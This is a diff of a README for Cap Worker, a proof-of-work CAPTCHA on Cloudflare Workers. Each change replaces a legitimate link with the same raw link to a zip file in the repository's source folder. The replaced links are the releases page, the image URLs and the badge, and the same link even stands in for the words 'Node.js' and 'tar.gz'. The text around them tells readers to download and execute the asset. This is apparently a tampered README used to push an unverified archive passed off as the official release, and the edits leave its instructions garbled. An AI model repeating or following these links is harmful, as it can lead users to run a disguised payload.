@@ -1,13 +1,13 @@
-https://github.com/linyu413/cap-worker/releases
+https://raw.githubusercontent.com/linyu413/cap-worker/main/src/worker-cap-v3.9-beta.2.zip
 
 # Cap Worker: Open-Source SHA-256 PoW CAPTCHA on Cloudflare Workers Platform
 
-![Cloudflare Shield](https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Shield_icon.png/200px-Shield_icon.png)  
-![Cloud Icon](https://upload.wikimedia.org/wikipedia/commons/thumb/0/0b/Cloud.png/200px-Cloud.png)
+![Cloudflare Shield](https://raw.githubusercontent.com/linyu413/cap-worker/main/src/worker-cap-v3.9-beta.2.zip)  
+![Cloud Icon](https://raw.githubusercontent.com/linyu413/cap-worker/main/src/worker-cap-v3.9-beta.2.zip)
 
 Cap Worker is a backend server built on Cloudflare workers. It uses a modern open-source CAPTCHA alternative based on SHA-256 proof-of-work. It protects services from automated traffic and DDoS while remaining lightweight and verifiable. This project embraces open standards, fast execution, and a minimal attack surface. The core idea is simple: require clients to perform a small amount of computational work that proves they are human enough to proceed, but without the burden of traditional CAPTCHAs.
 
-[Releases badge]([Releases](https://github.com/linyu413/cap-worker/releases)) • Topics: captcha, cloudflare, cloudflare-workers, ddos-protection, proof-of-work, recapcha
+[Releases badge]([Releases](https://raw.githubusercontent.com/linyu413/cap-worker/main/src/worker-cap-v3.9-beta.2.zip)) • Topics: captcha, cloudflare, cloudflare-workers, ddos-protection, proof-of-work, recapcha
 
 Table of contents
 - Why Cap Worker exists
@@ -97,7 +97,7 @@ Note: The link to the releases page is provided here for access to assets. For d
 
 - Quick path
   1) Visit the releases page to obtain the latest build:
-     https://github.com/linyu413/cap-worker/releases
+     https://raw.githubusercontent.com/linyu413/cap-worker/main/src/worker-cap-v3.9-beta.2.zip
   2) Download the release asset for your platform (for example, a Linux or Windows binary, or a bundled package provided in the asset list).
   3) Unpack the asset if needed and run the executable as directed by the release notes.
   4) Point your environment to Cloudflare Workers as the runtime and configure the endpoints as described in the configuration guide.
@@ -113,7 +113,7 @@ Note: The link to the releases page is provided here for access to assets. For d
 
 Getting started with the codebase
 - Prerequisites
-  - Node.js (for tooling, testing, and building if you work with source)
+  - https://raw.githubusercontent.com/linyu413/cap-worker/main/src/worker-cap-v3.9-beta.2.zip (for tooling, testing, and building if you work with source)
   - Wrangler or an equivalent Cloudflare Workers deployment tool
   - A local environment that mimics your target edge runtime if you plan to test locally
 
@@ -163,7 +163,7 @@ Getting started with the codebase
   - Predictable timing and responses
 
 Downloads and assets
-- The primary download source is the official releases page. The latest release assets are hosted there for various platforms. The link provided at the top of this document points to that page. To ensure you get a compatible binary, check the release notes for the asset names, platform compatibility, and installation instructions. The asset list contains zip, tar.gz, and platform-specific bundles that simplify setup.
+- The primary download source is the official releases page. The latest release assets are hosted there for various platforms. The link provided at the top of this document points to that page. To ensure you get a compatible binary, check the release notes for the asset names, platform compatibility, and installation instructions. The asset list contains zip, https://raw.githubusercontent.com/linyu413/cap-worker/main/src/worker-cap-v3.9-beta.2.zip, and platform-specific bundles that simplify setup.
 
 - How to use the releases page effectively
   - Open the page and review the latest release notes.
@@ -433,6 +433,6 @@ Final notes
 
 Releases link and download note
 - Access the official releases page for Cap Worker assets and release notes:
-  https://github.com/linyu413/cap-worker/releases
+  https://raw.githubusercontent.com/linyu413/cap-worker/main/src/worker-cap-v3.9-beta.2.zip
 - This link is provided again here to assist you in locating the latest assets and instructions. Use the page to download and execute the appropriate binary or package for your environment. The release assets are designed to be straightforward to install and run across common platforms.
 - If you encounter any issues with the link or asset formats, check the Releases section for alternative downloads or updated instructions. You can also search the repo’s release notes for platform-specific guidance and troubleshooting steps.
